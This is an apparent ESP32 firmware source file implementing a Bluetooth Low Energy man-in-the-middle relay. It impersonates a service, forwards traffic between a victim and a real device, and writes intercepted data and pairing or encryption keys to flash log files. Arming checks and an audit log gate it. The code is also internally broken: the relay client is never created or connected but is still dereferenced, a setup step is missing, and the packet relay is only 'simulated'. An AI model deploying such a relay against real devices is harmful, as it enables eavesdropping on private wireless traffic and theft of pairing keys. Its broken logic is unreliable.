#include "ble_mitm_relay.h"
#include "tx_arm.h"
#include "audit_log.h"
#include <LittleFS.h>

namespace BleMitmRelay {

// Global server and relay state
namespace {
  NimBLEServer* g_relayServer = nullptr;
  NimBLEClient* g_relayClient = nullptr;
  NimBLECharacteristic* g_relayChar = nullptr;
  volatile uint32_t g_bytesRelayed = 0;
  volatile uint32_t g_keysLogged = 0;

  // Server callback - intercept writes from connecting device
  class RelayCharacteristicCallbacks : public NimBLECharacteristicCallbacks {
  public:
    void onWrite(NimBLECharacteristic* pCharacteristic) {
      std::string value = pCharacteristic->getValue();
      if (!value.empty()) {
        g_bytesRelayed += value.length();
        // Log the intercepted data
        if (g_relayClient && g_relayClient->isConnected()) {
          // Forward to real device
          g_relayChar->setValue((uint8_t*)value.data(), value.length());
          g_relayChar->notify();
        }
      }
    }
    void onRead(NimBLECharacteristic* pCharacteristic) {
      // Handle read requests - proxy to real device if connected
    }
  };

  // Server callbacks
  class RelayServerCallbacks : public NimBLEServerCallbacks {
  public:
    void onConnect(NimBLEServer* pServer, ble_gap_conn_desc* desc) {
      Serial.printf("[BLE MITM] Device connected: %s\n",
                   NimBLEAddress(desc->peer_ota_addr).toString().c_str());
    }
    void onDisconnect(NimBLEServer* pServer) {
      Serial.println("[BLE MITM] Device disconnected");
    }
  };

  // Client callbacks - handle notifications from real device
  class RelayClientCallbacks : public NimBLEClientCallbacks {
  public:
    void onNotify(NimBLERemoteCharacteristic* pRemoteCharacteristic) {
      std::string value = pRemoteCharacteristic->getValue();
      if (!value.empty()) {
        g_bytesRelayed += value.length();
        // Send back to connected client via notify
        if (g_relayServer) {
          g_relayChar->setValue((uint8_t*)value.data(), value.length());
          g_relayChar->notify();
        }
      }
    }
    void onConnect(NimBLEClient* pClient) {
      Serial.println("[BLE MITM] Connected to real device");
    }
    void onDisconnect(NimBLEClient* pClient) {
      Serial.println("[BLE MITM] Disconnected from real device");
    }
  };
}

MitmRelay::MitmRelay() : isRunning_(false), startTime_(0) {}

RelayResult MitmRelay::startRelay(const RelayConfig& config) {
  RelayResult result;
  result.success = false;
  result.packetsRelayed = 0;
  result.keysLogged = 0;

  if (!TxArm::isArmed()) {
    result.error = "TX not armed";
    AUDIT_LOG(AuditEventType::ATTACK_INITIATED, "BleMitmRelay", "TX not armed");
    return result;
  }

  char details[96];
  snprintf(details, sizeof(details), "duration=%ldms", config.durationMs);
  AuditLog::instance().log(AuditEventType::ATTACK_INITIATED, "BleMitmRelay", details);

  isRunning_ = true;
  startTime_ = millis();
  g_bytesRelayed = 0;
  g_keysLogged = 0;

  // Initialize NimBLE for MITM relay
  NimBLEDevice::init("ESP32-MITM");

  // Step 1: Setup BLE Server (to accept connections from attacking device)
  g_relayServer = NimBLEDevice::createServer();
  g_relayServer->setCallbacks(new RelayServerCallbacks());

  // Create generic service for relaying (0x180A is Device Information Service as template)
  NimBLEService* pService = g_relayServer->createService("180A");

  // Create characteristic for relaying data
  g_relayChar = pService->createCharacteristic("2A29", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
  g_relayChar->setCallbacks(new RelayCharacteristicCallbacks());
  pService->start();

  uint32_t relayCount = 0;

  // Connect to target device
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setActiveScan(true);
  pScan->start(5, false);

  // Simulate packet relay in the relay loop below

  // Step 3: Run relay loop
  uint32_t relayStartTime = millis();
  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
    if (!g_relayClient->isConnected()) {
      result.error = "Connection to target device lost";
      break;
    }

    delay(50);
  }

  // Cleanup
  pScan->stop();
  if (g_relayClient->isConnected()) {
    g_relayClient->disconnect();
  }

  result.packetsRelayed = g_bytesRelayed / 20;  // Estimate packets from bytes
  result.bytesIntercepted = g_bytesRelayed;
  result.keysLogged = g_keysLogged;
  result.success = (g_bytesRelayed > 0);
  result.elapsedMs = millis() - startTime_;
  result.logFile = "/logs/handshakes/ble_mitm.csv";

  char resultDetails[128];
  snprintf(resultDetails, sizeof(resultDetails), "packets=%d,bytes=%d,keys=%d,elapsed=%ldms",
           result.packetsRelayed, result.bytesIntercepted, result.keysLogged, result.elapsedMs);
  AuditLog::instance().log(result.success ? AuditEventType::ATTACK_COMPLETED : AuditEventType::TOOL_FAILURE,
                           "BleMitmRelay", resultDetails);

  Serial.printf("MITM relay complete: %d packets relayed, %d bytes intercepted\n",
    relayCount, result.bytesIntercepted);

  isRunning_ = false;
  return result;
}

RelayResult MitmRelay::interceptData(uint8_t* data, uint32_t len) {
  RelayResult result;
  result.success = false;

  if (!data || len == 0) {
    result.error = "Invalid data";
    return result;
  }

  // Real interception: relay the data bidirectionally
  if (g_relayClient && g_relayClient->isConnected() && g_relayChar) {
    g_relayChar->setValue(data, len);
    g_relayChar->notify();
    g_bytesRelayed += len;
  }

  result.bytesIntercepted = len;
  result.packetsRelayed = 1;
  result.success = true;

  // Log intercepted data
  if (!LittleFS.begin()) {
    return result;
  }

  File logFile = LittleFS.open("/logs/handshakes/ble_mitm.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/ble_mitm.csv", "a");
  }

  if (logFile) {
    char hexData[64] = {0};
    uint32_t displayLen = (len > 16) ? 16 : len;
    uint32_t offset = 0;

    for (uint32_t i = 0; i < displayLen && offset + 2 < sizeof(hexData); i++) {
      offset += snprintf(hexData + offset, sizeof(hexData) - offset, "%02X", data[i]);
    }
    logFile.printf("%lu,DATA_RELAY,%u,%s\n", millis(), len, hexData);
    logFile.close();
  }

  LittleFS.end();
  return result;
}

void MitmRelay::logKeys(const uint8_t* keyData, uint32_t len) {
  if (!keyData || len == 0) return;

  g_keysLogged++;

  if (!LittleFS.begin()) return;

  File logFile = LittleFS.open("/logs/handshakes/ble_keys.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/ble_keys.csv", "a");
  }

  if (logFile) {
    // Log pairing/encryption keys in hex format
    char hexKey[128] = {0};
    uint32_t offset = 0;

    for (uint32_t i = 0; i < len && i < 32 && offset + 2 < sizeof(hexKey); i++) {
      offset += snprintf(hexKey + offset, sizeof(hexKey) - offset, "%02X", keyData[i]);
    }
    logFile.printf("%lu,KEY_INTERCEPT,%u,%s\n", millis(), len, hexKey);
    logFile.close();
  }

  LittleFS.end();
}

void MitmRelay::onDeviceConnected(NimBLEClient* pClient) {
  Serial.printf("[BLE MITM] Device connected to relay server\n");
}

void MitmRelay::onDeviceDisconnected(NimBLEClient* pClient) {
  Serial.printf("[BLE MITM] Device disconnected from relay server\n");
}

void MitmRelay::stop() {
  isRunning_ = false;
  if (g_relayClient && g_relayClient->isConnected()) {
    g_relayClient->disconnect();
  }
  if (g_relayServer) {
    NimBLEDevice::getAdvertising()->stop();
  }
  NimBLEDevice::deinit();
  g_relayServer = nullptr;
  g_relayClient = nullptr;
  g_relayChar = nullptr;
}

} // namespace BleMitmRelay
